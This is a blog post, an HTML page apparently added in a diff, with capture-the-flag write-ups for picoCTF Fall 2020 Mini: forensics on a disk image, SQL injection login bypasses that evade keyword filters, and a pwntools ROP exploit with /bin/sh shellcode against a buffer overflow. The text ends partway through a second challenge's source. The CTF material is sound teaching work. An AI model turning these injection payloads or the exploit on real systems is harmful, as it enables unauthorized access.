@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>picoCTF Fall 2020 Mini</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/picoctf-mini-2020/#nothing-up-my-sleeve">Nothing Up My Sleeve</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/picoctf-mini-2020/#pitter-patter-platters">Pitter, Patter, Platters</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/picoctf-mini-2020/#web-gauntlet">Web Gauntlet</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/picoctf-mini-2020/#round-1">round 1</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/picoctf-mini-2020/#round-2">round 2</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/picoctf-mini-2020/#round-3">round 3</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/picoctf-mini-2020/#round-4">round 4</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/picoctf-mini-2020/#round-5">round 5</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/picoctf-mini-2020/#guessing-game-1">guessing game 1</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/picoctf-mini-2020/#guessing-game-2">guessing game 2</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/picoctf-mini-2020/#otp-implementation">OTP Implementation</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>picoCTF Fall 2020 Mini</h1>
+    </header>
+
+    <div class="content">
+        <p>In October 2020 picoCTF put on a month long mini competition to celebrate National Cybersecurity Awareness Month.  I solved all the challenges and made writeups for them all.</p>
+<span id="continue-reading"></span><h1 id="nothing-up-my-sleeve">Nothing Up My Sleeve</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Let&#39;s check that your internet connection is working. This flag is &#39;in-the-clear&#39;, I promise! Download flag.txt
+</span></code></pre>
+<p>Not much to see here -- the flag is in the downloadable flag file.</p>
+<p>flag: picoCTF{c0ngr4ts_0n_y0ur_$@||1-|-L|}</p>
+<h1 id="pitter-patter-platters">Pitter, Patter, Platters</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>&#39;Suspicious&#39; is written all over this disk image. Download suspicious.dd.sda1
+</span></code></pre>
+<p><a href="/ctf/picoctf-mini-2020/pitter_patter_platters/suspicious.dd.sda1">suspicious.dd.sda1</a></p>
+<p>Well, okay, let's mount it. <code>sudo mount -o loop suspicious.dd.sda1 fs</code></p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ cd fs
+</span><span>❯ ls
+</span><span>boot  lost+found  suspicious-file.txt  tce
+</span><span>❯ cat suspicious-file.txt
+</span><span>Nothing to see here! But you may want to look here --&gt;
+</span></code></pre>
+<p>I'm gonna take a wild guess (which happened to be correct) and check the data right after this file.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ strings -td suspicious.dd.sda1 | grep &quot;Nothing to see here&quot;
+</span><span>2098176 Nothing to see here! But you may want to look here --&gt;
+</span><span>❯ dd if=suspicious.dd.sda1 skip=2098176 count=128 iflag=skip_bytes,count_bytes of=slice
+</span><span>
+</span><span>0+1 records in
+</span><span>0+1 records out
+</span><span>128 bytes copied, 0.000143797 s, 890 kB/s
+</span><span>❯ xxd slice
+</span><span>00000000: 4e6f 7468 696e 6720 746f 2073 6565 2068  Nothing to see h
+</span><span>00000010: 6572 6521 2042 7574 2079 6f75 206d 6179  ere! But you may
+</span><span>00000020: 2077 616e 7420 746f 206c 6f6f 6b20 6865   want to look he
+</span><span>00000030: 7265 202d 2d3e 0a7d 0038 0033 0034 0036  re --&gt;.}.8.3.4.6
+</span><span>00000040: 0030 0063 0061 0065 005f 0033 003c 005f  .0.c.a.e._.3.&lt;._
+</span><span>00000050: 007c 004c 006d 005f 0031 0031 0031 0074  .|.L.m._.1.1.1.t
+</span><span>00000060: 0035 005f 0033 0062 007b 0046 0054 0043  .5._.3.b.{.F.T.C
+</span><span>00000070: 006f 0063 0069 0070 0000 0000 0000 0000  .o.c.i.p........
+</span></code></pre>
+<p>That sure looks promising.  We can filter out the null bytes and reverse it with a little python.</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">python</span><span style="color:#ffcc66;"> -c </span><span style="color:#bae67e;">&quot;print(&#39;&#39;.join(reversed(&#39;}.8.3.4.6.0.c.a.e._.3.&lt;._.|.L.m._.1.1.1.t.5._.3.b.{.F.T.C.o.c.i.p&#39;.split(&#39;.&#39;))))&quot; 
+</span></code></pre>
+<p>flag: picoCTF{b3_5t111_mL|_&lt;3_eac06438}</p>
+<h1 id="web-gauntlet">Web Gauntlet</h1>
+<h3 id="round-1">round 1</h3>
+<p>Round 1 filters <code>or</code></p>
+<p><code>1' union select * from users where username='admin'-- </code></p>
+<h3 id="round-2">round 2</h3>
+<p>Round 2 filters <code>or and like = --</code>
+to fix this we justneed to change the comment and the way we filter down to only admin.  /* works as a comment and i guessed that admin was the first alphabetically and filtered with a less than.<br />
+<code>1' union select * from users where username&lt;'bdmin'/* </code></p>
+<h3 id="round-3">round 3</h3>
+<p>Round 3 filters <code>or and = like &gt; &lt; --</code></p>
+<p>this one blocks spaces so we gotta replace the spaces with comments</p>
+<p><code>1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*</code></p>
+<h3 id="round-4">round 4</h3>
+<p>Round 4 filters <code>or and = like &gt; &lt; -- admin</code></p>
+<p>easy fix, just don't log in to admin explicitly and let the limit 1 take care of us</p>
+<p><code>1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*</code></p>
+<h3 id="round-5">round 5</h3>
+<p>Round 5 filters <code>or and = like &gt; &lt; -- admin union</code></p>
+<p>I spent far too long trying to find another way to union without union and then the solution clicked.  I control the username as well so I can just select admin and then comment out the password check.</p>
+<p><code>'||'adm'||'in'/*"</code></p>
+<h1 id="guessing-game-1">guessing game 1</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I made a simple game to show off my programming skills. See if you can beat it! vuln vuln.c Makefile nc jupiter.challenges.picoctf.org 28951
+</span></code></pre>
+<p><a href="/ctf/picoctf-mini-2020/guessing_game_1/vuln">vuln</a></p>
+<pre data-lang="makefile" style="background-color:#212733;color:#ccc9c2;" class="language-makefile "><code class="language-makefile" data-lang="makefile"><span style="color:#ffd580;">all</span><span style="color:#f29e74;">:
+</span><span>	</span><span style="color:#ffd580;">gcc</span><span style="color:#ffcc66;"> -m64 -fno-stack-protector -O0 -no-pie -static -o</span><span> vuln vuln.c
+</span><span>
+</span><span style="color:#ffd580;">clean</span><span style="color:#f29e74;">:
+</span><span>	</span><span style="color:#ffd580;">rm</span><span> vuln
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;unistd.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/types.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/stat.h&gt;
+</span><span>
+</span><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">BUFSIZE </span><span style="color:#ffcc66;">100
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">long </span><span style="color:#ffd580;">increment</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#ffcc66;">in</span><span>) {
+</span><span>	</span><span style="color:#ffa759;">return</span><span> in </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">long </span><span style="color:#ffd580;">get_random</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#f28779;">rand</span><span>() </span><span style="color:#f29e74;">%</span><span> BUFSIZE</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">do_stuff</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">long</span><span> ans </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">get_random</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	ans </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">increment</span><span>(ans)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">int</span><span> res </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;What number would you like to guess?</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> guess[BUFSIZE]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">fgets</span><span>(guess</span><span style="color:#ccc9c2cc;">,</span><span> BUFSIZE</span><span style="color:#ccc9c2cc;">,</span><span> stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">long</span><span> g </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">atol</span><span>(guess)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span>g) {
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;That&#39;s not a valid number!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(g </span><span style="color:#f29e74;">==</span><span> ans) {
+</span><span>			</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Congrats! You win! Your prize is this print statement!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			res </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>		} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>			</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Nope!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span><span>	</span><span style="color:#ffa759;">return</span><span> res</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">win</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">char</span><span> winner[BUFSIZE]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;New winner!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Name? &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">fgets</span><span>(winner</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">360</span><span style="color:#ccc9c2cc;">,</span><span> stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Congrats </span><span style="color:#ffcc66;">%s</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> winner)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">argc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">**</span><span style="color:#ffcc66;">argv</span><span>){
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">,</span><span> _IONBF</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="font-style:italic;color:#5c6773;">// Set the gid to the effective gid
+</span><span>	</span><span style="font-style:italic;color:#5c6773;">// this prevents /bin/sh from dropping the privileges
+</span><span>	</span><span style="font-style:italic;color:#5ccfe6;">gid_t</span><span> gid </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">getegid</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">setresgid</span><span>(gid</span><span style="color:#ccc9c2cc;">,</span><span> gid</span><span style="color:#ccc9c2cc;">,</span><span> gid)</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">int</span><span> res</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to my guessing game!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">while </span><span>(</span><span style="color:#ffcc66;">1</span><span>) {
+</span><span>		res </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">do_stuff</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(res) {
+</span><span>			</span><span style="color:#ffd580;">win</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Nothing too crazy in the source code -- we have to "guess" (aka generate an unseeded random number) the number and then we get a buffer overflow.  We don't have any way to read the flag in the source code so we'll need to do something clever.  The Makefile is a little more interesting -- the binary is statically compiled which means we can't do my first thought (ret2libc).</p>
+<p>I looked around the binary and did some research and eventually found the function <code>_dl_make_stack_executable</code> which does exactly what it sounds like.  It is a fairly simple function</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>[0x00400a40]&gt; pdf@sym._dl_make_stack_executable
+</span><span>┌ 82: sym._dl_make_stack_executable (int64_t arg1);
+</span><span>│           ; arg int64_t arg1 @ rdi
+</span><span>│           0x00480860      488b3591a923.  mov rsi, qword [obj._dl_pagesize] ; [0x6bb1f8:8]=0x1000
+</span><span>│           0x00480867      53             push rbx
+</span><span>│           0x00480868      4889fb         mov rbx, rdi                ; arg1
+</span><span>│           0x0048086b      488b17         mov rdx, qword [rdi]        ; arg1
+</span><span>│           0x0048086e      4889f7         mov rdi, rsi
+</span><span>│           0x00480871      48f7df         neg rdi
+</span><span>│           0x00480874      4821d7         and rdi, rdx
+</span><span>│           0x00480877      483b15329223.  cmp rdx, qword [obj.__libc_stack_end] ; [0x6b9ab0:8]=0
+</span><span>│       ┌─&lt; 0x0048087e      7520           jne 0x4808a0
+</span><span>│       │   0x00480880      8b156a962300   mov edx, dword [obj.__stack_prot] ; [0x6b9ef0:4]=0x1000000
+</span><span>│       │   0x00480886      e8f5abfcff     call sym.__mprotect
+</span><span>│       │   0x0048088b      85c0           test eax, eax
+</span><span>│      ┌──&lt; 0x0048088d      7521           jne 0x4808b0
+</span><span>│      ││   0x0048088f      48c703000000.  mov qword [rbx], 0
+</span><span>│      ││   0x00480896      830d4ba92300.  or dword [obj._dl_stack_flags], 1 ; [0x6bb1e8:4]=7
+</span><span>│      ││   0x0048089d      5b             pop rbx
+</span><span>│      ││   0x0048089e      c3             ret
+</span><span>..
+</span><span>│      ││   ; CODE XREF from sym._dl_make_stack_executable @ 0x48087e
+</span><span>│      │└─&gt; 0x004808a0      b801000000     mov eax, 1
+</span><span>│      │    0x004808a5      5b             pop rbx
+</span><span>│      │    0x004808a6      c3             ret
+</span><span>..
+</span><span>│      │    ; CODE XREF from sym._dl_make_stack_executable @ 0x48088d
+</span><span>│      └──&gt; 0x004808b0      48c7c0c0ffff.  mov rax, 0xffffffffffffffc0
+</span><span>│           0x004808b7      5b             pop rbx
+</span><span>│           0x004808b8      648b00         mov eax, dword fs:[rax]
+</span><span>└           0x004808bb      c3             ret
+</span></code></pre>
+<p>So: <code>_dl_make_stack_executable</code> takes a single argument, wraps <code>mprotect</code> and changes the memory protection to <code>__stack_prot</code>.  <code>__stack_prot</code> happens to be writable so we can change that to 7 (rwx) and then call <code>_dl_make_stack_executable</code> with an argument of <code>__libc_stack_end</code>.  After that it's essentially over - we can put our shellcode on the stack and then ROP to it.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>ctypes </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span style="color:#ffa759;">import </span><span>time
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">CDLL</span><span>(</span><span style="color:#bae67e;">&quot;libc.so.6&quot;</span><span>)
+</span><span style="font-style:italic;color:#5c6773;"># http://shell-storm.org/shellcode/files/shellcode-603.php
+</span><span>shellcode </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><span style="color:#bae67e;">&quot;
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;termite&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_next</span><span>():
+</span><span>	</span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rand</span><span>() </span><span style="color:#f29e74;">% </span><span style="color:#ffcc66;">100</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1
+</span><span>
+</span><span>elf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./vuln&quot;</span><span>)
+</span><span>rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(elf)
+</span><span>
+</span><span>mov_rdx_rax </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000419127 </span><span style="font-style:italic;color:#5c6773;"># pwntools couldn&#39;t find this idk why
+</span><span>pop_rdx </span><span style="color:#f29e74;">= </span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span>([</span><span style="color:#bae67e;">&#39;pop rdx&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span>]))[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>pop_rdi </span><span style="color:#f29e74;">= </span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span>([</span><span style="color:#bae67e;">&#39;pop rdi&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span>]))[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>pop_rax </span><span style="color:#f29e74;">= </span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span>([</span><span style="color:#bae67e;">&#39;pop rax&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span>]))[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>push_rsp </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000451974 </span><span style="font-style:italic;color:#5c6773;"># pwntools couldn&#39;t find this idk why
+</span><span>
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;jupiter.challenges.picoctf.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">28951</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(</span><span style="color:#ffd580;">get_next</span><span>())) </span><span style="font-style:italic;color:#5c6773;"># first randomly generated number + 1
+</span><span>
+</span><span>
+</span><span>payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">B</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">120
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rdx) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__stack_prot&#39;</span><span>])
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rax) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">7</span><span>)
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(mov_rdx_rax)
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__libc_stack_end&#39;</span><span>])
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;_dl_make_stack_executable&#39;</span><span>])
+</span><span>payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span>(push_rsp) </span><span style="color:#f29e74;">+ </span><span>shellcode
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">5</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Name?&quot;</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat flag.txt;exit;&quot;</span><span>)
+</span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(picoCTF{.*?})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span></code></pre>
+<h1 id="guessing-game-2">guessing game 2</h1>
+<p><a href="/ctf/picoctf-mini-2020/guessing_game_2/vuln">vuln</a></p>
+<pre data-lang="makefile" style="background-color:#212733;color:#ccc9c2;" class="language-makefile "><code class="language-makefile" data-lang="makefile"><span style="color:#ffd580;">all</span><span style="color:#f29e74;">:
+</span><span>	</span><span style="color:#ffd580;">gcc</span><span style="color:#ffcc66;"> -m32 -no-pie -Wl</span><span>,-z,relro,-z,now</span><span style="color:#ffcc66;"> -o</span><span> vuln vuln.c
+</span><span style="color:#ffd580;">debug</span><span style="color:#f29e74;">:
+</span><span>	</span><span style="color:#ffd580;">gcc</span><span style="color:#ffcc66;"> -m32 -no-pie -Wl</span><span>,-z,relro,-z,now</span><span style="color:#ffcc66;"> -g -o</span><span> vuln_debug vuln.c
+</span><span style="color:#ffd580;">clean</span><span style="color:#f29e74;">:
+</span><span>	</span><span style="color:#ffd580;">rm</span><span> vuln
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;unistd.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/types.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/stat.h&gt;
+</span><span>
+</span><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">BUFSIZE </span><span style="color:#ffcc66;">512
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">long </span><span style="color:#ffd580;">get_random</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">return</span><span> rand</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">get_version</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">do_stuff</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">long</span><span> ans </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffd580;">get_random</span><span>() </span><span style="color:#f29e74;">% </span><span style="color:#ffcc66;">4096</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">int</span><span> res </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>	
